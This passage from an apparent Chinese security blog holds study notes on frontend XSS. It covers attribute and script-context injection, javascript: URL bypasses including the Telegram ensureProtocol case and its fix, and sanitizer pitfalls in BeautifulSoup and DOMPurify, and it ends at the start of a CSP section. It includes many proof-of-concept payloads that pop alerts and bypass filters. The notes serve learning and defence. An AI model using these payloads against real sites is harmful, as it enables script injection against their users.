<p>第一种闭合div，增加一个标签<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;img src=not_exist onerror=alert(1)&gt;</span></span><br></pre></td></tr></table></figure><br>那么代码就会变为<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">not_exist</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span></span><br><span class="line"><span class="language-xml">  Demo</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>第二种闭合”然后增加属性<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; tabindex=1 onfocus=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot; x=&quot;</span></span><br></pre></td></tr></table></figure><br>那么就会变成<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;&quot;</span> tabindex=<span class="number">1</span> onfocus=<span class="string">&quot;alert(1)&quot;</span> x=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">  <span class="title class_">Demo</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="注入到js中"><a href="#注入到js中" class="headerlink" title="注入到js中"></a>注入到js中</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">name</span> = `<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="meta">?&gt;</span>`;</span><br><span class="line">  <span class="title function_ invoke__">alert</span>(name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>当代码是这样的时候<br><code>?name=$&#123;alert(1)&#125;</code>可以用这种语句去注入js</p>
<p>如果是用双引号的形式，如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">name</span> = <span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$_GET</span>[&#x27;name&#x27;]) ?&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">alert</span>(name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>这样可能就没法进行注入js了，但是如果没有htmlspecialchars过滤的话，就可以用闭合<code>&quot;</code>或者闭合<code>&lt;script&gt;</code>标签进行注入,在注入其他标签<br>例如<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&quot;;alert(1);&quot;</span></span><br><span class="line">name=&lt;/script&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全3-js伪协议（笔记）</title>
    <url>/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前一直以为经过htmlspecialchars之后就不存在xss漏洞了，现在想来还是我太肤浅了</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10315118">https://ithelp.ithome.com.tw/articles/10315118</a><span id="more"></span>
<h2 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h2>可以触发的标签<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">f2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">form</span>=<span class="string">f2</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(2)</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
这种一般都是容易被忽略的注入xss的点，看到下面的代码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$data</span>) ?&gt;&quot;</span>&gt;link&lt;/a&gt;`</span><br></pre></td></tr></table></figure>
虽然他被html编码了，但是仍然可以用伪协议去触发<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt></li>
</ul>
<p>当然，<code>window.location</code>也是可以触发伪协议的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;javascript:alert(1)&#x27;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><p>上面已经提到过了，html编码是行不通的，直接删掉javascript，攻击者就可以通过下面的代码进行绕过<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&amp;#106avascript:alert(1)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>所以一般是通过白名单的方式，验证他的开头是否是http或者https这样<br>在tg中就出现过这样的问题<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ensureProtocol</span>(<span class="params">url?: string</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!url) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">includes</span>(<span class="string">&#x27;://&#x27;</span>) ? url : <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>他并没有判断开头是否是<code>http://</code>或者是<code>https://</code>，所以导致攻击者可以用下面的代码进行绕过<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;://&#x27;</span>)</span><br></pre></td></tr></table></figure><br>但是要在服务器也会判断上面的代码是否合规，那上面的代码显然不行，不过攻击者用了一种特殊写法绕过了。<br>URL的完全体一般是长下面的样子的<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://username:password@www.example.com/</span><br></pre></td></tr></table></figure><br>所以构造绕过payload<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;Slonser was here!&#x27;</span>);<span class="comment">//@github.com</span></span><br></pre></td></tr></table></figure><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;Slonser was here!&#x27;);//@github.com&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就能弹窗了<br>tg的修复方式如下<br><a href="https://github.com/Ajaxy/telegram-tt/commit/a8d025395bc0032d964c2afc8c4fb5d2fa631a44">https://github.com/Ajaxy/telegram-tt/commit/a8d025395bc0032d964c2afc8c4fb5d2fa631a44</a><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ensureProtocol</span>(<span class="params">url?: string</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!url) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// HTTP was chosen by default as a fix for https://bugs.telegram.org/c/10712.</span></span><br><span class="line">  <span class="comment">// It is also the default protocol in the official TDesktop client.</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> parsedUrl = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line">    <span class="comment">// eslint-disable-next-line no-script-url</span></span><br><span class="line">    <span class="keyword">if</span> (parsedUrl.<span class="property">protocol</span> === <span class="string">&#x27;javascript:&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> url;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>利用URL去解析url，并提取出protocol，并判断</p>
<h2 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h2><p>一般来说加个<code>target=&quot;_blank&quot;</code>，就可以解决上面的问题<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://kaikaix.github.io&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在chrome中，点开上面的会先新建一个about:blank，然后在打开博客<br>在firefox中，会先新建一个空页面，在打开博客<br>但是所有都是先新建一个空页面，再去操作<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>如果是如上的情况就只会新建一个页面，然后不会有其他的操作<br>但是这只是用鼠标左键的情况<br>当你用鼠标中键，也就是按一下那个滚轮，或者你用ctrl加左键，同样可以触发<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/4.png" alt></p>
<h2 id="题外话-innerHTML和innerText"><a href="#题外话-innerHTML和innerText" class="headerlink" title="题外话 innerHTML和innerText"></a>题外话 innerHTML和innerText</h2><h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>现在有一个test.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span> = <span class="string">&#x27;可控，但是无法绕过引号&#x27;</span></span><br></pre></td></tr></table></figure><br>另一个页面加载了该js<br>这时候应该怎么去执行xss<br>如果是<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>是无法执行的，innerHTML禁止了script标签<br>这时候可以用img标签onerror属性去绕过<br>也可以用iframe标签的srcdoc去绕过<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe srcdoc=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"><span class="comment">//当然下面这种也是可以的</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>属性中的内容是可以经过编码的<br>之前sekaictf拿到golf jail我就以为有了编码就不可能存在xss了</p>
<h3 id="innerText"><a href="#innerText" class="headerlink" title="innerText"></a>innerText</h3><p>接下来看看innerText<br>还是一样的代码，只不过改成innerText<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerText</span> = <span class="string">&#x27;&lt;iframe&lt;?php echo ($_GET[&#x27;</span>name<span class="string">&#x27;]) ?&gt;&gt;&lt;/iframe&gt;&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>可以看到他将你输入的尖括号之类的特殊字符都进行了html编码，那么就不会在存在xss漏洞了<br>但是有一点比较奇怪，当你从innerText中取东西，比如下面的代码<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">123</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerText</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>虽然<code>&lt;a&gt;</code>中的内容经过了编码，但是显示却是下面的内容<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>所以就会有一种情况，当年输入的内容被编码了，但是如果有以下的代码，就有可能会被绕过<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">123</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span><span class="symbol">&amp;lt;</span>img src=1 onerror=alert(1)<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerHTML</span> = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerText</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>为什么不用<code>&lt;script&gt;</code>标签，上面提过innerHTML是不会去执行script标签下的代码的</p>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全4-Sanitization（笔记）</title>
    <url>/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇主要讲讲xss的绕过和防御</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10315367">https://ithelp.ithome.com.tw/articles/10315367</a><span id="more"></span>
</li>
</ul>
<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>上一篇讲过了，编码在一些情况下是无法进行过滤xss的，下面是一些常见框架或语言过滤xss的方法</p>
<ul>
<li>前端：一般使用<code>innerText</code>来代替<code>innerHTML</code></li>
<li>Laravel： <code>&#123;&#123; $text &#125;&#125;</code>是编码的，<code>&#123;!! $text !!&#125;</code>是原本的</li>
<li>Jinja：<code>&#123;&#123; test &#125;&#125;</code> 是编码的，<code>&#123;&#123; text | safe &#125;&#125;</code>是原始格式</li>
</ul>
<p>但是有些时候，就是需要输出一些带有html的代码，这时候应该如何去过滤</p>
<h2 id="sanitize"><a href="#sanitize" class="headerlink" title="sanitize"></a>sanitize</h2><p>先来说说BeautifulSoup，当你用他进行解析html，想过滤一些东西的时候，就有可能会出现问题<br>先来看看简单的demo<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    test</span></span><br><span class="line"><span class="string">    &lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;img src=x onerror=alert(1)&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tree = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> tree.find_all():</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;name: <span class="subst">&#123;element.name&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;attrs: <span class="subst">&#123;element.attrs&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><br>这段代码的output是<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name: div</span><br><span class="line">attrs: &#123;&#125;</span><br><span class="line">name: script</span><br><span class="line">attrs: &#123;&#125;</span><br><span class="line">name: img</span><br><span class="line">attrs: &#123;<span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;onerror&#x27;</span>: <span class="string">&#x27;alert(1)&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><br>但是当你遇到下面的代码<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    test</span></span><br><span class="line"><span class="string">    &lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tree = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> tree.find_all():</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;name: <span class="subst">&#123;element.name&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;attrs: <span class="subst">&#123;element.attrs&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><br>这段的输出是<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name: div</span><br><span class="line">attrs: &#123;&#125;</span><br></pre></td></tr></table></figure><br>看上去好像没问题，因为这行代码看上去是注释<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</span></span><br></pre></td></tr></table></figure><br>但是其实，在浏览器的解析中碰到第一个<code>&gt;</code>的时候就已经闭合注释了，但是BeautifulSoup中，他是解析为到最后一个<code>&gt;</code>都是注释<br>这里有相应的ctf题</p>
<ul>
<li><a href="https://github.com/Seraphin-/ctf/blob/master/irisctf2023/feelingtagged.md">https://github.com/Seraphin-/ctf/blob/master/irisctf2023/feelingtagged.md</a></li>
<li><a href="https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu#bypassing-html-sanitization">https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu#bypassing-html-sanitization</a></li>
</ul>
<h2 id="DOMPurify"><a href="#DOMPurify" class="headerlink" title="DOMPurify"></a>DOMPurify</h2><p>基本用法如下<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html);</span><br></pre></td></tr></table></figure><br>他并不是单纯的过滤或者编码<br>该套件运行一些安全的tag，和一些安全的attr<br>当然可以通过配置增加一些tag或者attr，如下<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">ADD_TAGS</span>: [<span class="string">&#x27;iframe&#x27;</span>],</span><br><span class="line">  <span class="attr">ADD_ATTR</span>: [<span class="string">&#x27;src&#x27;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> html = <span class="string">&#x27;&lt;div&gt;&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br><span class="line"><span class="comment">// &lt;div&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">html = <span class="string">&#x27;&lt;div&gt;&lt;iframe src=https://example.com&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br><span class="line"><span class="comment">// &lt;div&gt;&lt;iframe src=&quot;https://example.com&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>但是可以看到，对于不安全的代码，仍然会过滤掉，但是在一些情况下也不会被过滤掉<br>就比如下面这种<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">ADD_TAGS</span>: [<span class="string">&#x27;iframe&#x27;</span>],</span><br><span class="line">  <span class="attr">ADD_ATTR</span>: [<span class="string">&#x27;srcdoc&#x27;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">html = <span class="string">&#x27;&lt;div&gt;&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt></p>
<h3 id="xhtml和html"><a href="#xhtml和html" class="headerlink" title="xhtml和html"></a>xhtml和html</h3><p>在style标签底下的尖括号都不会被DOMPurify给过滤<br>这是一个挺重要的特性，在之前DOMPurify变体中就会造成绕过，在html和xhtml的解析标准不同下，也会造成绕过的漏洞<br>还有一个特点就是，在属性中的内容也不会被转义<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;]]&gt;&lt;/style&gt;&lt;script&gt;&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在html中这段看似没问题，DOMPurify也不会对他进行过滤<br>但是在xhtml中，CDATA那段就会被视为注释<br><figure class="highlight xhtml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>最后就会解析成这种样子</p>
<h2 id="错误的使用这些库的方式"><a href="#错误的使用这些库的方式" class="headerlink" title="错误的使用这些库的方式"></a>错误的使用这些库的方式</h2><p>这里因为没有亲身经历过，也没办法复现，还是去看huli大佬的博客吧</p>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全5-CSP（笔记）</title>
    <url>/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为绕过的方式太多，有时候一不小心就会写出一个含有xss漏洞的代码，这时候要怎么去防御。那么就是依靠CSP进行防御了</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10315612">https://ithelp.ithome.com.tw/articles/10315612</a><span id="more"></span>
<h2 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content Security Policy"></a>Content Security Policy</h2>网页要加上CSP策略有3种方法</li>
<li>HTTP Respond header加上 Content-Security-Policy</li>
<li>加上<code>meta</code>标签</li>
<li><h3 style="text-decoration: line-through;">iframe标签，在本章不讲</h3>

</li>
</ul>
<p>先看个简单的案例<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;none&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>上面的html并不会有弹窗，因为被csp策略阻止了<br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br><code>script-src &#39;none&#39;</code>的意思就是禁止任何脚本执行，包括</p>
